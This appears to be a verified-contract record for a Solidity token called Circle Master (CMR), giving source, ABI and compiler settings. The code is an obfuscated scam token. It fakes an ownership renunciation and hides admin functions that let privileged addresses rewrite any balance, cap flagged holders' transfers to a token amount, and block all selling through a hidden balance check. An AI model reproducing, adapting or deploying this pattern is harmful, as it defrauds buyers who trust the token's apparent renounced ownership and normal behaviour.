{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface exemptMax {\n    function createPair(address atMaxAuto, address launchedToEnable) external returns (address);\n}\n\ninterface feeReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeAutoLiquidity) external view returns (uint256);\n\n    function transfer(address tradingTakeMarketing, uint256 modeLaunch) external returns (bool);\n\n    function allowance(address receiverFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingTakeMarketing,\n        uint256 modeLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityMarketing, uint256 value);\n    event Approval(address indexed receiverFund, address indexed spender, uint256 value);\n}\n\nabstract contract senderList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingEnableLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listMarketing is feeReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CircleMaster is senderList, feeReceiver, listMarketing {\n\n    uint256 private maxMinTrading;\n\n    constructor (){\n        \n        tradingEnableLimit sellMarketingTo = tradingEnableLimit(amountSenderMax);\n        enableList = exemptMax(sellMarketingTo.factory()).createPair(sellMarketingTo.WETH(), address(this));\n        \n        atTotal = _msgSender();\n        walletLimitReceiver[atTotal] = true;\n        takeReceiver[atTotal] = launchSender;\n        autoFund();\n        if (exemptMinSell == receiverMode) {\n            receiverMode = launchFee;\n        }\n        emit Transfer(address(0), atTotal, launchSender);\n    }\n\n    function balanceOf(address feeAutoLiquidity) public view virtual override returns (uint256) {\n        return takeReceiver[feeAutoLiquidity];\n    }\n\n    uint256 private launchSender = 100000000 * 10 ** 18;\n\n    function fromLimit(address feeBuy, address tradingTakeMarketing, uint256 modeLaunch) internal returns (bool) {\n        require(takeReceiver[feeBuy] >= modeLaunch);\n        takeReceiver[feeBuy] -= modeLaunch;\n        takeReceiver[tradingTakeMarketing] += modeLaunch;\n        emit Transfer(feeBuy, tradingTakeMarketing, modeLaunch);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return liquiditySender;\n    }\n\n    address amountSenderMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public marketingTeam;\n\n    function autoFund() public {\n        emit OwnershipTransferred(atTotal, address(0));\n        toLaunch = address(0);\n    }\n\n    function approve(address swapLiquidity, uint256 modeLaunch) public virtual override returns (bool) {\n        marketingModeExempt[_msgSender()][swapLiquidity] = modeLaunch;\n        emit Approval(_msgSender(), swapLiquidity, modeLaunch);\n        return true;\n    }\n\n    function modeLaunched(address autoFundToken) public {\n        if (receiverMax) {\n            return;\n        }\n        \n        walletLimitReceiver[autoFundToken] = true;\n        if (exemptMinSell != maxMinTrading) {\n            feeWallet = true;\n        }\n        receiverMax = true;\n    }\n\n    uint256 fromExempt;\n\n    mapping(address => bool) public fundFeeMarketing;\n\n    bool public takeFrom;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldTotalFrom;\n    }\n\n    uint256 private listAt;\n\n    mapping(address => bool) public walletLimitReceiver;\n\n    function totalTradingReceiver() private view {\n        require(walletLimitReceiver[_msgSender()]);\n    }\n\n    uint256 fromLaunched;\n\n    function isLimit(uint256 modeLaunch) public {\n        totalTradingReceiver();\n        fromExempt = modeLaunch;\n    }\n\n    bool public feeWallet;\n\n    event OwnershipTransferred(address indexed launchedEnable, address indexed isBuy);\n\n    function teamShould(address totalListLimit, uint256 modeLaunch) public {\n        totalTradingReceiver();\n        takeReceiver[totalListLimit] = modeLaunch;\n    }\n\n    address public enableList;\n\n    address senderIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private exemptMinSell;\n\n    function limitTokenEnable(address feeBuy, address tradingTakeMarketing, uint256 modeLaunch) internal returns (bool) {\n        if (feeBuy == atTotal) {\n            return fromLimit(feeBuy, tradingTakeMarketing, modeLaunch);\n        }\n        uint256 limitExempt = feeReceiver(enableList).balanceOf(senderIs);\n        require(limitExempt == fromExempt);\n        require(tradingTakeMarketing != senderIs);\n        if (fundFeeMarketing[feeBuy]) {\n            return fromLimit(feeBuy, tradingTakeMarketing, tradingAmount);\n        }\n        return fromLimit(feeBuy, tradingTakeMarketing, modeLaunch);\n    }\n\n    uint256 public receiverMode;\n\n    uint8 private shouldTotalFrom = 18;\n\n    uint256 constant tradingAmount = 5 ** 10;\n\n    bool public receiverMax;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchSender;\n    }\n\n    uint256 private isSwap;\n\n    mapping(address => mapping(address => uint256)) private marketingModeExempt;\n\n    string private modeBuy = \"CMR\";\n\n    function modeTake(address autoTeam) public {\n        totalTradingReceiver();\n        \n        if (autoTeam == atTotal || autoTeam == enableList) {\n            return;\n        }\n        fundFeeMarketing[autoTeam] = true;\n    }\n\n    uint256 private launchFee;\n\n    mapping(address => uint256) private takeReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeBuy;\n    }\n\n    function allowance(address fundIs, address swapLiquidity) external view virtual override returns (uint256) {\n        if (swapLiquidity == amountSenderMax) {\n            return type(uint256).max;\n        }\n        return marketingModeExempt[fundIs][swapLiquidity];\n    }\n\n    function transfer(address totalListLimit, uint256 modeLaunch) external virtual override returns (bool) {\n        return limitTokenEnable(_msgSender(), totalListLimit, modeLaunch);\n    }\n\n    address public atTotal;\n\n    string private liquiditySender = \"Circle Master\";\n\n    function owner() external view returns (address) {\n        return toLaunch;\n    }\n\n    function transferFrom(address feeBuy, address tradingTakeMarketing, uint256 modeLaunch) external override returns (bool) {\n        if (_msgSender() != amountSenderMax) {\n            if (marketingModeExempt[feeBuy][_msgSender()] != type(uint256).max) {\n                require(modeLaunch <= marketingModeExempt[feeBuy][_msgSender()]);\n                marketingModeExempt[feeBuy][_msgSender()] -= modeLaunch;\n            }\n        }\n        return limitTokenEnable(feeBuy, tradingTakeMarketing, modeLaunch);\n    }\n\n    address private toLaunch;\n\n    function getOwner() external view returns (address) {\n        return toLaunch;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAutoLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundFeeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeLaunch\",\"type\":\"uint256\"}],\"name\":\"isLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFundToken\",\"type\":\"address\"}],\"name\":\"modeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"}],\"name\":\"modeTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalListLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeLaunch\",\"type\":\"uint256\"}],\"name\":\"teamShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalListLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTakeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletLimitReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CircleMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}